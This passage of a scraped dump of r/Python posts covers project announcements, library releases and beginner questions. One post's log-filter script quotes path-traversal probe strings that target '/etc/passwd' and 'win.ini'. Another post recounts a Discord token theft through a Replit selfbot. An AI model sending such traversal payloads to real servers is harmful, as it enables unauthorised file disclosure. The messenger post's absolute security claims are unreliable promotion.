2.	‚Å†Tag creation by bots (e.g. during automated releases) leads to problems with branch protection. See here for a full discussion. Versioning only from commits == no branch protection escape hatches needed.

3.	‚Å†Not all commits are relevant for end users of a project/library (e.g., CI changes, bot updates, or tooling config), yet many versioning schemes count them in. With filtering, comver can exclude such noise.

## Target audience

Developers (not only Python devs) relying on software versioning, especially those relying on semver.

## Comparison

Described in the why section, but:

- I haven't seen versioning allowing you for this (or any I think?) level of commit filtering
- Have not seen semver not using git tags (at least in Python ecosystem) at all for version calculation/saving

## Links

- GitHub repository: https://github.com/open-nudge/comver
- Full documentation here
- FOSS Python template used: https://github.com/open-nudge/opentemplate (does heavy lifting by defining boilerplate like pyproject.toml, tooling, pipelines, security features, releases and more). __If you are interested in the source code of this project, I suggest starting with `/src` and `/tests`, otherwise consult this repository.__

If you think you might be interested in this (or similar) tools in the future, consider checking out social media:

- LinkedIn: https://www.linkedin.com/company/opennudge
- Twitter/X: https://x.com/opennudge

If you find this project useful or interesting please consider:

- Starring the repository on GitHub here: https://github.com/open-nudge/comver
- Liking or commenting on this post

Thanks in advance!"
1me95d2,My DJ style audio thumbnailer is now open source: Xochi Thumbnailer,alzy101,4,0,2025-07-31 18:18:55,https://www.reddit.com/r/Python/comments/1me95d2/my_dj_style_audio_thumbnailer_is_now_open_source/,"Hello Python devs, after several months of prototyping and reimplementing in C++, I have finally decided to open source my projects [audio thumbnailer](https://github.com/Alzy/Xochi-Thumbnailer).

  
**What is it**

[Xochi Thumbnailer](https://github.com/Alzy/Xochi-Thumbnailer) that creates  informative waveform images from audio files based on the waveform drawing functionality found in popular DJ equipment such as Pioneer/AlphaTheta and Denon playback devices and software. It features three renderer types: \`three-band\`, \`three-band-interpolated\`, and \`rainbow\`. You'll recognize these if you've ever DJed on popular decks and controllers. The interpolated variant of the three band renderer is extra nice if you're looking to match the color scheme of your application's interface.

  
**Who is it for**

I present my thumbnailer to any and all developers working on audio applications or related applications. It's useful for visually seeing the energy of the audio at any given region. The rainbow renderer cooler colors where high frequency information dominates and warmer colors where the low frequencies are prominent. Similarly, the three band renderers layer the frequency band waveforms over one another with high frequencies at the top. Some clever use of power scaling allows for increased legibility of higher frequency content as well as being more 'true' to the original DJ hardware.

  
I welcome all discussion and contributions! Let me know if you find this useful in your project or have some ideas on other waveform varients I could try to implement.



**Comparison to other methods**

In my initial search for an algorithm to render DJ style waveforms, I initially looked at the way [freesound.org](http://freesound.org) implemented theirs. I found them to not be as 'legible' as conventional DJ device waveforms and wondered why that might be. I suppose it's because I'm maybe just 'used' to the DJ waveforms but I'm sure others can relate. Their implementation also uses fourier transforms which made the process a bit slower, something I felt could use improvement. I tried their approach as well as some other variants but ultimately found that simple filtered signals are more than sufficient. Ultimately, my approach is closest to the Beat-Link project's implementation which attempts to directly replicate the Pioneer/AlphaTheta waveforms. Finally, my implementation generates not only images but reusable binary format files based on Reaper's waveform format. In this way you can use the python thumbnailer to process audio and use your language of choice to render the waveform (say on the web and/or in realtime).

  
You can find the project here: [https://github.com/Alzy/Xochi-Thumbnailer](https://github.com/Alzy/Xochi-Thumbnailer)"
1me8zv2,What is the value of Python over SQL/SAS?,talk_to_me_25,0,22,2025-07-31 18:13:00,https://www.reddit.com/r/Python/comments/1me8zv2/what_is_the_value_of_python_over_sqlsas/,"I am a data analyst at a large company where I write a lot of SQL and some SAS code to query databases for specific business analyses.  We have data all over the place (Teradata, Oracle, Google Cloud Platform, etc) and I need to focus on answering business questions and recommending things to optimize and grow revenue. From what I‚Äôve read and seen, the primary value of Python would be in automation of data jobs, etc.  I know Python is the latest buzz word and trend (just like everyone wants to use AI).  Is it really worth my time to expand my skillset to include Python rather than continuing to leverage SQL?  So far, I‚Äôm not convinced.  "
1me7h8x,YouTube Channel Scraper with ViewStats,Illustrious-Tap-3345,7,0,2025-07-31 17:15:57,https://www.reddit.com/r/Python/comments/1me7h8x/youtube_channel_scraper_with_viewstats/,"Built a YouTube channel scraper that pulls creators in any niche using the YouTube Data API and then enriches them with analytics from ViewStats (via Selenium). Useful for anyone building tools for creator outreach, influencer marketing, or audience research.

It outputs a CSV with subs, views, country, estimated earnings, etc. Pretty easy to set up and customize if you want to integrate it into a larger workflow or app.

Github Repo:¬†[https://github.com/nikosgravos/yt-creator-scraper](https://github.com/nikosgravos/yt-creator-scraper)

Feedback or suggestions welcome. If you like the idea make sure to star the repository.

Thanks for your time."
1me3iio,Understanding Python's Data Model,Sea-Ad7805,117,20,2025-07-31 14:45:26,https://www.reddit.com/r/Python/comments/1me3iio/understanding_pythons_data_model/,"**Problem Statement**

Many beginners, and even some advanced developers, struggle with the Python Data Model, especially concepts like:

* references
* shared data between variables
* mutability
* shallow vs deep copy

These aren't just academic concerns, misunderstanding these often leads to bugs that are difficult to diagnose and fix.

**What My Project Does**

The [`memory_graph`](https://github.com/bterwijn/memory_graph) package makes these concepts more approachable by visualizing Python data step-by-step, helping learners build an accurate mental model.

To demonstrate, here‚Äôs a short program as a multiple-choice exercise:

        a = ([1], [2])
        b = a
        b[0].append(11)
        b += ([3],)
        b[1].append(22)
        b[2].append(33)
        
        print(a)

What will be the output?

* A) `([1], [2])`
* B) `([1, 11], [2])`
* C) `([1, 11], [2, 22])`
* D) `([1, 11], [2, 22], [3, 33])`

üëâ See the [Solution](https://raw.githubusercontent.com/bterwijn/memory_graph_videos/refs/heads/main/exercises/exercise5.gif) and [Explanation](https://github.com/bterwijn/memory_graph?tab=readme-ov-file#python-data-model), or check out [more exercises](https://www.reddit.com/r/Python_memory_graph/).

**Comparison**

The older [Python Tutor](https://pythontutor.com/) tool provides similar functionality, but has [many limitations](https://github.com/pythontutor-dev/pythontutor/blob/master/unsupported-features.md). It only runs on small code snippets in the browser, whereas `memory_graph` runs locally and works on real, multi-file programs in many IDEs or development environments.

**Target Audience**

The `memory_graph` package is useful in teaching environments, but it's also helpful for analyzing problems in production code. It provides handles to keep the graph small and focused, making it practical for real-world debugging and learning alike."
1me2p2c,Useful django-page-resolver library has been released!,PlayEnvironmental759,1,4,2025-07-31 14:13:12,https://www.reddit.com/r/Python/comments/1me2p2c/useful_djangopageresolver_library_has_been/,"This is python utility for Django that helps determine the page number on which a specific model instance appears within a paginated queryset or related object set. It also includes a Django templatetag for rendering HTMX + Bootstrap-compatible pagination with support for large page ranges and dynamic page loading.

Imagine you're working on a Django project where you want to highlight or scroll to a specific item on a paginated list ‚Äî for example, highlighting a comment on a forum post. To do this, you need to calculate which page that comment appears on and then include that page number in the URL, like so:

`localhost:8000/forum/posts/151/?comment=17&page=4`

This allows you to directly link to the page where the target item exists. Instead of manually figuring this out, use FlexPageResolver or PageResolverModel.

See¬†[Documentation](https://pypi.org/project/django-page-resolver/)."
1mdzcyf,datatrees & xdatatrees Release: Improved Forward Reference Handling and New XML Field Types,GianniMariani,6,0,2025-07-31 11:46:57,https://www.reddit.com/r/Python/comments/1mdzcyf/datatrees_xdatatrees_release_improved_forward/,"Just released a new version of the `datatrees` and `xdatatrees` libraries with several key updates.

* `datatrees 0.3.6`: An extension for Python `dataclasses`.
* `xdatatrees 0.1.2`: A declarative XML serialization library for `datatrees`.

# Key Changes:

**1. Improved Forward Reference Diagnostics (**`datatrees`**)** Using an undefined forward reference (e.g., `'MyClass'`) no longer results in a generic `NameError`. The library now raises a specific `TypeError` that clearly identifies the unresolved type hint and the class it belongs to, simplifying debugging.

**2. New Field Type:** `TextElement` **(**`xdatatrees`**)** This new field type directly maps a class attribute to a simple XML text element.

* **Example Class:**

&#8203;

        @xdatatree
        class Product:
             name: str = xfield(ftype=TextElement)
    
    * **Resulting XML:**
    ```xml
    <product><name>My Product</name></product>

**3. New Field Type:** `TextContent` **(**`xdatatrees`**)** This new field type maps a class attribute to the text content of its parent XML element, which is essential for handling mixed-content XML.

* **Example Class:**

&#8203;

    @xdatatree
    class Address:
        label: str = xfield(ftype=Attribute)
        text: str = xfield(ftype=TextContent)
    obj = Address(label=""work"", text=""123 Main St"")

* **Resulting Object from**

&#8203;

    <address label=""work"">123 Main St</address>

These updates enhance the libraries' usability for complex, real-world data structures and improve the overall developer experience.

# Links:

* **datatrees:** [GitHub](https://github.com/owebeeone/datatrees) | [PyPI](https://pypi.org/project/datatrees/)
* **xdatatrees:** [GitHub](https://github.com/owebeeone/xdatatrees) | [PyPI](https://pypi.org/project/xdatatrees/) | [Full Documentation](https://github.com/owebeeone/xdatatrees/blob/main/DOCUMENTATION.md)"
1mdvynt,Real‚Äëworld ML course with personalized gamified challenges‚Äîfeedback wanted on structure & format! üéì,ps948,0,1,2025-07-31 08:22:28,https://www.reddit.com/r/Python/comments/1mdvynt/realworld_ml_course_with_personalized_gamified/,"Hi everyone ‚Äî I've been lurking these subreddits for years and finally wrapped up a course that‚Äôs very much inspired by what I‚Äôve learned from this community.

I previously created a Udemy course‚Äîbut in retrospect it felt too one‚Äësize‚Äëfits‚Äëall and lacked engagement. Feedback showed that it wasn‚Äôt personalized enough, and students tends to drop off without reaching applied concepts.

So this iteration (on [Uphop.ai](https://www.uphop.ai/app/c/02d00637-0d71-40b3-af0b-ace55c2b6378?code=e12cd)) has been designed from scratch to tackle those issues:

* **Practice games at the end of every unit**, not just quiz questions‚Äîscenario-based immersive tasks. It‚Äôs true gamification applied to learning design, which literatures show can really boost engagement and performance when tailored to individual user preferences.
* **Hyper‚Äëpersonalized experience**: learners get to pick challenges or paths that suit their goals, pacing, and interests, instead of being forced into a rigid progression.
* **Core modules**: Supervised/Unsupervised Learning, NLP, Deep Learning, AI ethics, Cloud deployments.

I‚Äôd love your honest feedback on:

1. Does the idea of challenge-based ‚Äúgames‚Äù at the end of modules sound motivating to you?
2. Would a hyper-personalized track (choose‚Äëyour‚Äëown‚Äëchallenge or order) make a difference in how you'd stick with a course?
3. How balanced does the path from foundations ‚Üí advanced topics sound? Any parts you‚Äôd reorder or expand?

The first unit is completely free to experience. I‚Äôd welcome thoughts on roadmap, flow, interactivity‚Äîeven phrasing or structure.

[Course Link](https://www.uphop.ai/app/c/02d00637-0d71-40b3-af0b-ace55c2b6378?code=e12cd)

Thanks in advance for any feedback!"
1mdu6r1,Coldwire - Post-Quantum Messenger,Individual-Horse-866,3,18,2025-07-31 06:27:50,https://www.reddit.com/r/Python/comments/1mdu6r1/coldwire_postquantum_messenger/,"Hi all, I've recently created this post-quantum messenger. It's really decent and could potentially become better than Off-The-Record Messaging.

# What My Project Does:

* Best‚Äëcase security: achieves unbreakable encryption under the principles of information theory using one‚Äëtime pads
* Worst‚Äëcase security: falls back only to ML‚ÄëKEM‚Äë1024 (Kyber) resistance
* Perfect-Forward-Secrecy: on every OTP batch through ephemeral PQC key exchanges
* Plausible Deniability: messages are not cryptographically tied to you, providing more deniability than Off‚ÄëThe‚ÄëRecord messaging !
* Mandatory SMP: We enforce Socialist millionaire problem before any chat. MiTM attacks are impossible.
* NIST PQC Tier‚Äë5: We use highest security algorithms (Kyber1024, Dilithium5) that provide AES‚Äë256 strength using OQS Project
* Minimal Attack Surface: Tkinter UI only, no embedded browsers or HTML, Minimal Python dependencies, All untrusted inputs truncated to safe lengths to prevent buffer‚Äëoverflow in liboqs or Tk
* Traffic obfuscation: Network adversaries (ISP, etc) cannot block Coldwire, because we utilize HTTP(s).
* Metadata‚ÄëFree: Random 16‚Äëdigit session IDs, no server contacts, no logs, no server‚Äëside metadata, enforced passwordless authentication. Everything is local, encrypted, and ephemeral.



# Target Audience:

* Security researchers
* Privacy advocates and privacy-conscious users
* OTR and OMEMO users



# Comparison:

This cannot be compared to Signal, Matrix, or any other mainstream ""E2EE"" chatting app. Coldwire makes some compromises between usability and security. And we always go for security.



For instance, multi-device support, avatars, usernames, bio, etc. Are all non existent in Coldwire to prevent metadata. They're not encrypted, they don't even exist.



Additionally. We enforce SMP verification to completely prevent MiTM.



In comparison, Signal uses TOFU, which is fine, but for better security, enforced SMP verification eliminates a whole class of MiTM attacks, and of course, on the cost of usablility. To properly use SMP verification, you need to talk to your contact through a secure out-of-band channel to exchange the answer.



TL;DR: This isn't the next Signal or Matrix, we make heavy security enforcements on the cost of general-usability



Additionally, our app still hasn't been audited.  And it only works on Desktop.



Official repository:

[https://github.com/Freedom-Club-FC/Coldwire](https://github.com/Freedom-Club-FC/Coldwire)"
1mdq489,Proxy for using LSP in a Docker container,RichardHapb,11,2,2025-07-31 02:43:35,https://www.reddit.com/r/Python/comments/1mdq489/proxy_for_using_lsp_in_a_docker_container/,"I just solved a specific problem: handling the LSP inside a Docker container without requiring the libraries to be installed on the host. This was focused in Python using Pyright and Ruff, but can be extensible to another language.

[https://github.com/richardhapb/lsproxy](https://github.com/richardhapb/lsproxy)"
1mdmo51,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,2,2,2025-07-31 00:00:29,https://www.reddit.com/r/Python/comments/1mdmo51/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1mdlsqx,using the not operation in a python if statement,bassmanrod,0,8,2025-07-30 23:21:23,https://www.reddit.com/r/Python/comments/1mdlsqx/using_the_not_operation_in_a_python_if_statement/,"I'm writing a script to look for keywords like \`ERROR\` but to omit lines that has \`ERROR\` followed by characters and a string \`/mvc/.%2e/.%2e/.%2e/.%2e/winnt/win.ini\] with root cause\`.

¬†Here is the script

¬†

     for row in lines:
    ¬†¬†¬†¬†¬†if ('OutOfMemoryError'¬†¬†¬†¬†¬†¬† in row or
    ¬†¬†¬†¬†¬†¬†¬†¬†'DEADLINE_EXCEEDED'¬†¬†¬†¬†¬†¬† in row or
    ¬†¬†¬†¬†¬†¬†¬† 'CommandTimeoutException' in row or
    ¬†¬†¬†¬†¬†¬†¬†¬†'ERROR'¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† in row or
    ¬†¬†¬†¬†¬†¬†¬† 'FATAL'¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† in row and
    ¬†¬†¬†¬†¬†¬†¬†¬†'/mvc/.%2e/.%2e/.%2e/.%2e/winnt/win.ini] with root cause' not in row or
    ¬†¬†¬†¬†¬†¬†¬†¬†¬†'/mvc/.%2e/.%2e/.%2e/.%2e/windows/win.ini] with root cause' not in row or
    ¬†¬†¬†¬†¬†¬†¬†¬†'/mvc/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd] with root cause' not in row):
    ¬†¬†¬†¬†
    ¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†print(row, flush=True)
    ¬†

I just want my script to print the lines that has \`OutOfMemoryError\` \`DEADLINE\_EXCEEDED\` \`CommandTimeoutException\` \`ERROR\` with out \`/mvc/.%2e/.%2e/.%2e/.%2e\` \`FATAL\` and nothing else.

But it's printing \`ERROR\` with \`/mvc/.%2e/.%2e/.%2e/.%2e\` and it's printing other lines."
1mdi14s,Granian 2.5 is out,gi0baro,182,8,2025-07-30 20:47:21,https://www.reddit.com/r/Python/comments/1mdi14s/granian_25_is_out/,"[Granian](https://github.com/emmett-framework/granian) ‚Äì the Rust HTTP server for Python applications ‚Äì¬†2.5 was just released.

Main highlights from this release are:

* support for listening on Unix Domain Sockets
* memory limiter for workers

Full release details: [https://github.com/emmett-framework/granian/releases/tag/v2.5.0](https://github.com/emmett-framework/granian/releases/tag/v2.5.0)  
Project repo: [https://github.com/emmett-framework/granian](https://github.com/emmett-framework/granian)  
PyPi: [https://pypi.org/p/granian](https://pypi.org/p/granian)"
1mdfeh3,CLI Tool For Quickly Navigating Your File System (Arch Linux),BravestCheetah,6,14,2025-07-30 19:05:44,https://www.reddit.com/r/Python/comments/1mdfeh3/cli_tool_for_quickly_navigating_your_file_system/,"So i just made and uploaded my first package to the aur, the source code is availble at [https://github.com/BravestCheetah/DirLink](https://github.com/BravestCheetah/DirLink) .

**The Idea**

So as i am an arch user and is obsessed with clean folder structure, so my coding projects are quite deep in my file system, i looked for some type of macro or tool to store paths to quickly access them later so i dont have to type out "" cd /mnt/nvme0/programming/python/DirLinkAUR/dirlink"" all the time when coding (thats an example path). Sadly i found nothing and decided to develop it myself.

**Problems I Encountered**

I encountered one big problem, my first idea was to save paths and then with a single command it would automatically cd into that directory, but i realised quite quickly i couldnt run a cd command in the users active command prompt, so i kinda went around it, by utilizing pyperclip i managed to copy the command to the users clipboard instead of automatically running the command, even though the user now has to do one more step it turned out great and it is still a REALLY useful tool, at least for me.

**What My Project Does**

I resulted in a cli tool which has the ""dirlink"" command with 3 actions: new, remove and load:

new has 2 arguments, the name and the path. It saves this data to a links.dl-dat file which is just a json file with a custom extension in the program data folder, it fetches that directory using platformdirs.

remove also has 2 arguments and just does the opposite of the new command, its kinda self explanatory

load does what it says, it takes in a name and loads the path to the players clipboard.

Notice: there is a fourth command, ""getdata"" which i didnt list as its just a debug command that returns the path to the savefile.

**Target Audience**

The target audience is Arch users doing a lot of coding or other terminal dependant activities.

**Comparison**

yeah, you can use aliases but this is quicker to use and you can easily remove and add paths on the fly

**The Future**

In the future i will probably implement more features such as relative paths but currently im just happy i now only have to type the full path once, i hope this project can make at least one other peep happy and thank you for reading all of this i spent an evening writing.

**If You Wanna Try It**

If you use arch then i would really recommend to try it out, it is availbe on the AUR right here: [https://aur.archlinux.org/packages/dirlink](https://aur.archlinux.org/packages/dirlink) , now i havent managed to install it with yay yet but that is probably because i uploaded it 30 minutes ago and the AUR package index doesnt update immediently."
1mdag10,`tokenize`: a tip and a trap,HommeMusical,7,1,2025-07-30 16:00:09,https://www.reddit.com/r/Python/comments/1mdag10/tokenize_a_tip_and_a_trap/,"[`tokenize`](https://docs.python.org/3/library/tokenize.html) from the standard library is not often useful, but I had the pleasure of using it in a recent project.

Try `python -m tokenize <some-short-program>`, or `python -m tokenize` to experiment at the command line.

-----

The tip is this: `tokenize.generate_tokens` expects [a readline function that spits out lines as strings when called repeatedly](https://docs.python.org/3/library/tokenize.html#tokenize.generate_tokens), so if you want to mock calls to it, you need something like this:

    lines = s.splitlines()
    return tokenize.generate_tokens(iter(lines).__next__)

(Use `tokenize.tokenize` if you always have strings.)

----

The trap: there was a breaking change in the tokenizer between Python 3.11 and Python 3.12 because of the formalization of the grammar for f-strings from [PEP 701](https://docs.python.org/3/whatsnew/3.12.html#pep-701-syntactic-formalization-of-f-strings).

    $ echo 'a = f"" {h:{w}} ""' | python3.11 -m tokenize
    1,0-1,1:            NAME           'a'            
    1,2-1,3:            OP             '='            
    1,4-1,16:           STRING         'f"" {h:{w}} ""' 
    1,16-1,17:          NEWLINE        '\n'           
    2,0-2,0:            ENDMARKER      ''             

    $ echo 'a = f"" {h:{w}} ""' | python3.12 -m tokenize
    1,0-1,1:            NAME           'a'            
    1,2-1,3:            OP             '='            
    1,4-1,6:            FSTRING_START  'f""'           
    1,6-1,7:            FSTRING_MIDDLE ' '            
    1,7-1,8:            OP             '{'            
    1,8-1,9:            NAME           'h'            
    1,9-1,10:           OP             ':'            
    1,10-1,11:          OP             '{'            
    1,11-1,12:          NAME           'w'            
    1,12-1,13:          OP             '}'            
    1,13-1,13:          FSTRING_MIDDLE ''             
    1,13-1,14:          OP             '}'            
    1,14-1,15:          FSTRING_MIDDLE ' '            
    1,15-1,16:          FSTRING_END    '""'            
    1,16-1,17:          NEWLINE        '\n'           
    2,0-2,0:            ENDMARKER      ''"
1mdaf3c,replit (this guy being able to control hosted accs or smth)?,Glass-Trust-1485,0,11,2025-07-30 15:59:11,https://www.reddit.com/r/Python/comments/1mdaf3c/replit_this_guy_being_able_to_control_hosted_accs/,"So, this guy got my token cuz i ran his discord selfbot in replit but nothing in the code was malicious and its safe how? (I don't have any experience with repl.it), and idc about him getting my token i reset it already but i'm just curious how he got it without any malicious or obfuscated code or any code that sends my token to a webhook or smth and the token only exists in memory during script exec-

Here's the replit: [https://replit.com/@easyselfbots/Plasma-Selfbot-300-Commands-Working-2025?v=1#main.py](https://replit.com/@easyselfbots/Plasma-Selfbot-300-Commands-Working-2025?v=1#main.py)

Also  
1. None of the dependencies are malicious)  
2. I did NOT run any other malicious code, he was screensharing and each time i ran the code and put in my token it got logged"
1md88uh,Resources to improve Python skills,Bulky_Meaning7655,14,30,2025-07-30 14:35:19,https://www.reddit.com/r/Python/comments/1md88uh/resources_to_improve_python_skills/,I'm using Python in academia for several years now (mostly for numerical simulations) and later plan to switch from academia to industry. I feel that not having proper IT-company experience with code review and stuff I might lag behind in best software development practices or pure language knowledge. Would welcome any resources for learning to make this transition smoother. Or some realistic check-list from experienced Python devs to find my weak spots. 
1md7brl,Introduction to MCP Servers and writing one in Python,MetonymyQT,2,0,2025-07-30 13:58:41,https://www.reddit.com/r/Python/comments/1md7brl/introduction_to_mcp_servers_and_writing_one_in/,"I wrote a small article on introducing MCP servers, testing them with Postman and an LLM models with ango-framework.

[https://www.nuculabs.dev/threads/introduction-to-mcp-servers-and-writing-one-in-python.115/](https://www.nuculabs.dev/threads/introduction-to-mcp-servers-and-writing-one-in-python.115/)"
1md70te,AI-Powered Dynamic Rocket Trajectory Planner ‚Äî Ongoing Open Source Project!,The948k,0,2,2025-07-30 13:45:59,https://www.reddit.com/r/Python/comments/1md70te/aipowered_dynamic_rocket_trajectory_planner/,"Hey everyone!

I‚Äôm building an open source project called **AI-Powered Dynamic Rocket Trajectory Planner**. It‚Äôs a Python-based rocket flight simulator using a genetic algorithm to dynamically optimize launch angle and thrust. The simulation models realistic physics including thrust, air drag, and wind disturbances.

The project is still a work in progress, but if you‚Äôre interested in checking out the code or following along, my GitHub username is **AdityaAeroAI** and the repository is called **Rocket-Trajectory-AI** ‚Äî you can find it by searching directly on GitHub.

I‚Äôd love to get feedback, suggestions, or collaborators interested in aerospace AI and physics simulations.

Thanks for your time!"
1md3jg9,how to run codes more beautiful,Prestigious_Elk7012,0,11,2025-07-30 11:00:38,https://www.reddit.com/r/Python/comments/1md3jg9/how_to_run_codes_more_beautiful/,"hi I'm new to coding and I got suggested to start from python and that's what I'm doing. 

I'm using vscode. when I run my code in terminal there are many more writing that makes it difficult for me to see my code's real output I wondered if there is another more beautiful way to run my codes"
1md030c,Python Data Engineers: Meet Elusion v3.12.5 - Rust DataFrame Library with Familiar Syntax,DataBora,47,43,2025-07-30 07:21:32,https://www.reddit.com/r/Python/comments/1md030c/python_data_engineers_meet_elusion_v3125_rust/,"Hey Python Data engineers! üëã

I know what you're thinking: ""Another post trying to convince me to learn Rust?"" But hear me out -¬†**Elusion v3.12.5**¬†might be the easiest way for Python, Scala and SQL developers to dip their toes into Rust for data engineering, and here's why it's worth your time.

# ü§î ""I'm comfortable with Python/PySpark why switch?""

**Because the syntax is almost identical to what you already know!**

**Target audience:**

If you can write PySpark or SQL, you can write Elusion. Check this out:

**PySpark style you know:**

    result = (sales_df
        .join(customers_df, sales_df.CustomerKey == customers_df.CustomerKey, ""inner"")
        .select(""c.FirstName"", ""c.LastName"", ""s.OrderQuantity"")
        .groupBy(""c.FirstName"", ""c.LastName"")
        .agg(sum(""s.OrderQuantity"").alias(""total_quantity""))
        .filter(col(""total_quantity"") > 100)
        .orderBy(desc(""total_quantity""))
        .limit(10))

**Elusion in Rust (almost the same!):**

    let result = sales_df
        .join(customers_df, [""s.CustomerKey = c.CustomerKey""], ""INNER"")
        .select([""c.FirstName"", ""c.LastName"", ""s.OrderQuantity""])
        .agg([""SUM(s.OrderQuantity) AS total_quantity""])
        .group_by([""c.FirstName"", ""c.LastName""])
        .having(""total_quantity > 100"")
        .order_by([""total_quantity""], [false])
        .limit(10);

The learning curve is surprisingly gentle!

üî•¬†**Why Elusion is Perfect for Python Developers**

**What my project does:**

# 1. Write Functions in ANY Order You Want

Unlike SQL or PySpark where order matters, Elusion gives you complete freedom:

    // This works fine - filter before or after grouping, your choice!
    let flexible_query = df
        .agg([""SUM(sales) AS total""])
        .filter(""customer_type = 'premium'"")  
        .group_by([""region""])
        .select([""region"", ""total""])
        // Functions can be called in ANY sequence that makes sense to YOU
        .having(""total > 1000"");

**Elusion ensures consistent results regardless of function order!**

# 2. All Your Favorite Data Sources - Ready to Go

**Database Connectors:**

* ‚úÖ¬†**PostgreSQL**¬†with connection pooling
* ‚úÖ¬†**MySQL**¬†with full query support
* ‚úÖ¬†**Azure Blob Storage**¬†(both Blob and Data Lake Gen2)
* ‚úÖ¬†**SharePoint Online**¬†\- direct integration!

**Local File Support:**

* ‚úÖ¬†**CSV, Excel, JSON, Parquet, Delta Tables**
* ‚úÖ Read single files or entire folders
* ‚úÖ Dynamic schema inference

**REST API Integration:**

* ‚úÖ Custom headers, params, pagination
* ‚úÖ Date range queries
* ‚úÖ Authentication support
* ‚úÖ Automatic JSON file generation

# 3. Built-in Features That Replace Your Entire Stack

    // Read from SharePoint
    let df = CustomDataFrame::load_excel_from_sharepoint(
        ""tenant-id"",
        ""client-id"", 
        ""https://company.sharepoint.com/sites/Data"",
        ""Shared Documents/sales.xlsx""
    ).await?;
    
    // Process with familiar SQL-like operations
    let processed = df
        .select([""customer"", ""amount"", ""date""])
        .filter(""amount > 1000"")
        .agg([""SUM(amount) AS total"", ""COUNT(*) AS transactions""])
        .group_by([""customer""]);
    
    // Write to multiple destinations
    processed.write_to_parquet(""overwrite"", ""output.parquet"", None).await?;
    processed.write_to_excel(""output.xlsx"", Some(""Results"")).await?;

üöÄ¬†**Features That Will Make You Jealous**

# Pipeline Scheduling (Built-in!)

    // No Airflow needed for simple pipelines
    let scheduler = PipelineScheduler::new(""5min"", || async {
        // Your data pipeline here
        let df = CustomDataFrame::from_api(""https://api.com/data"", ""output.json"").await?;
        df.write_to_parquet(""append"", ""daily_data.parquet"", None).await?;
        Ok(())
    }).await?;

Advanced Analytics (SQL Window Functions)

    let analytics = df
        .window(""ROW_NUMBER() OVER (PARTITION BY customer ORDER BY date) as row_num"")
        .window(""LAG(sales, 1) OVER (PARTITION BY customer ORDER BY date) as prev_sales"")
        .window(""SUM(sales) OVER (PARTITION BY customer ORDER BY date) as running_total"");

Interactive Dashboards (Zero Config!)

    // Generate HTML reports with interactive plots
    let plots = [
        (&df.plot_line(""date"", ""sales"", true, Some(""Sales Trend"")).await?, ""Sales""),
        (&df.plot_bar(""product"", ""revenue"", Some(""Revenue by Product"")).await?, ""Revenue"")
    ];
    
    CustomDataFrame::create_report(
        Some(&plots),
        Some(&tables), 
        ""Sales Dashboard"",
        ""dashboard.html"",
        None,
        None
    ).await?;

üí™¬†**Why Rust for Data Engineering?**

1. **Performance**: 10-100x faster than Python for data processing
2. **Memory Safety**: No more mysterious crashes in production
3. **Single Binary**: Deploy without dependency nightmares
4. **Async Built-in**: Handle thousands of concurrent connections
5. **Production Ready**: Built for enterprise workloads from day one

# üõ†Ô∏è Getting Started is Easier Than You Think

    # Cargo.toml
    [dependencies]
    elusion = { version = ""3.12.5"", features = [""all""] }
    tokio = { version = ""1.45.0"", features = [""rt-multi-thread""] }

main. rs -¬†**Your first Elusion program**

    use elusion::prelude::*;
    
    #[tokio::main]
    async fn main() -> ElusionResult<()> {
        let df = CustomDataFrame::new(""data.csv"", ""sales"").await?;
        
        let result = df
            .select([""customer"", ""amount""])
            .filter(""amount > 1000"") 
            .agg([""SUM(amount) AS total""])
            .group_by([""customer""])
            .elusion(""results"").await?;
            
        result.display().await?;
        Ok(())
    }

**That's it! If you know SQL and PySpark, you already know 90% of Elusion.**

üí≠¬†**The Bottom Line**

**You don't need to become a Rust expert.**¬†Elusion's syntax is so close to what you already know that you can be productive on day one.

**Why limit yourself to Python's performance ceiling**¬†when you can have:

* ‚úÖ Familiar syntax (SQL + PySpark-like)
* ‚úÖ All your connectors built-in
* ‚úÖ 10-100x performance improvement
* ‚úÖ Production-ready deployment
* ‚úÖ Freedom to write functions in any order

**Try it for one weekend project.**¬†Pick a simple ETL pipeline you've built in Python and rebuild it in Elusion. I guarantee you'll be surprised by how familiar it feels and how fast it runs (after program compiles).

Check README on **GitHub**¬†repo: [https://github.com/DataBora/elusion/](https://github.com/DataBora/elusion/)   
to get started!"
1mczicz,Azure interactions,Unlucky252,16,16,2025-07-30 06:45:11,https://www.reddit.com/r/Python/comments/1mczicz/azure_interactions/,"
Hi,

Anyone got any experience with implementing azure into an app with python? 
Are there any good libraries for such things :)? 

Asking couse I need to figure out an app/platform that actively cooperates with a data base, azure is kinda my first guess for a thing like that.

Any tips welcome :D"
1mct7ds,Is Flask still one of the best options for integrating APIs for AI models?,faton2004,83,56,2025-07-30 01:10:43,https://www.reddit.com/r/Python/comments/1mct7ds/is_flask_still_one_of_the_best_options_for/,"Hi everyone,

I'm working on some AI and machine learning projects and need to make my models available through an API.
I know Flask is still commonly used for this, but I'm wondering if it's still the best choice these days.

Is Flask still the go-to option for serving AI models via an API, or are there better alternatives in 2025, like FastAPI, Django, or something else?


My main priorities are:
- Easy to use
- Good performance
- Simple deployment (like using Docker)
